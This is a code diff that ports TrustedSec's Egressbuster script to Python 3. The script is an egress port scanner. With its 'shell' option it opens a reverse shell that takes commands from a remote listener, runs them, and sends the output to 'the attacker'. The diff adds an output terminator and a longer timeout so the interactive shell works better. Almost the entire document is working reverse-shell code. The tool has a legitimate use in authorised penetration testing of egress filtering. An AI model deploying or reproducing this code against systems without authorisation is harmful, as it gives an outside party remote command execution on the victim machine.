@@ -1,4 +1,4 @@
-#!/usr/bin/python
+#!/usr/bin/python3
 #
 # TrustedSec Egressbuster Reverse Shell
 #
@@ -12,10 +12,11 @@ import os
 import socket
 import subprocess
 import sys
-import thread
+import _thread
 import time
 import socket
-
+import random
+import string 
 
 # How long to wait before making the next request (in seconds)
 sleep = 0.01
@@ -26,13 +27,15 @@ max_threads = 500
 # Display more output
 verbose = False
 
+shell_connected = False
+flag_length = 32
 
 # try to import
 try:
     ipaddr = sys.argv[1]
 
 except IndexError:
-    print """
+    print("""
 
         TrustedSec, LLC
    https://www.trustedsec.com
@@ -49,32 +52,39 @@ Note that the last flag is optional. If you want a shell to spawn when a port
 is detected, simply type 'shell' as the optional flag.
 
 Example: $ egressbuster.py 10.9.5.2 1-65536 shell
-        """
+""")
     sys.exit()
 
 
 def start_socket(ipaddr, base_port, shell):
     global num_threads
-
+    global shell_connected
     # increase thread count
     num_threads += 1
 
     if verbose or (base_port % 1000) == 0:
-        print "[v] Trying: TCP %s" % base_port
+        print("[v] Trying: TCP %s" % base_port)
+
+    # 3 seconds is too short if commands are going to be entered
+    if shell == "shell":
+        timeout = 300
 
     # try block to catch exceptions
     try:
         socket.setdefaulttimeout(timeout)
         sockobj = socket.socket()
         sockobj.connect((ipaddr, base_port))
-        sockobj.send(str(base_port))
-        sockobj.send('')
-        print "[*] Connection made to %s on port: %s/tcp" % (ipaddr, base_port)
-        if shell == "shell":
+        sockobj.send(str(base_port).encode())
+        print("[*] Connection made to %s on port: %s/tcp\n" % (ipaddr, base_port))
+        if shell == "shell" and not shell_connected:
+            results_terminator = '-'*5 + ''.join(random.choice(string.ascii_letters+string.digits) for i in range(flag_length)) + '-'*5
+            sockobj.send(results_terminator.encode())
+            shell_connected = True
             # start loop
             while 1:
                 # receive shell command
-                data = sockobj.recv(1024)
+                data = sockobj.recv(1024).decode()
+                print(data)
                 # if its quit, then break out and close socket
                 if data == "quit":
                     break
@@ -87,7 +97,7 @@ def start_socket(ipaddr, base_port, shell):
                             data = cwd + data
 
                     if os.path.isdir(data):
-                        print data
+                        print(data)
                         os.chdir(data)
                         stdout_value = "Changed directory."
 
@@ -100,8 +110,8 @@ def start_socket(ipaddr, base_port, shell):
                     # read output
                     stdout_value = proc.stdout.read() + proc.stderr.read()
                     # send output to attacker
-
-                sockobj.send(stdout_value)
+                result_string = stdout_value.decode() + "\n" + results_terminator
+                sockobj.send(result_string.encode())
         # close socket
         sockobj.close()
 
@@ -109,11 +119,11 @@ def start_socket(ipaddr, base_port, shell):
     except timeout:
         sockobj.close()
         if verbose:
-            print "[v] Can't use port: %s/tcp" % base_port
+            print("[v] Can't use port: %s/tcp" % base_port)
 
-#    except Exception,e :
-#		print e
-#    pass through, ports closed
+#    except Exception as e :
+#        print(e)
+#    pas through, ports closed
 #       pass
 
     finally:
@@ -144,27 +154,27 @@ base_port = int(lowport)
 end_port = int(highport)
 
 if end_port > 65536:
-    print "[i] Limiting to TCP 65536..."
+    print("[i] Limiting to TCP 65536...")
     end_port = 65536
 
-print "[i] Sending packets to egress listener (%s)..." % ipaddr
-print "[i] Starting at: %s/tcp, ending at: %s/tcp" % (base_port, end_port)
+print("[i] Sending packets to egress listener (%s)..." % ipaddr)
+print("[i] Starting at: %s/tcp, ending at: %s/tcp" % (base_port, end_port))
 
 while base_port <= end_port:
-    thread.start_new_thread(start_socket, (ipaddr, base_port, shell))
+    _thread.start_new_thread(start_socket, (ipaddr, base_port, shell))
     time.sleep(sleep)
 
     while num_threads >= max_threads:
         # Lower timeout value, increase max_threads or wait it out...
-        print "[!] On hold. max_threads limit reached (%s)" % (num_threads)
+        print("[!] On hold. max_threads limit reached (%s)" % (num_threads))
         time.sleep(timeout)
 
     base_port += 1
 
-print "[*] All packets have been sent"
+print("[*] All packets have been sent")
 
 while num_threads > 0:
-    print "[i] Remaining threads: %s" % num_threads
+    print("[i] Remaining threads: %s" % num_threads)
     time.sleep(2)
 
-print "[*] Done"
+print("[*] Done")
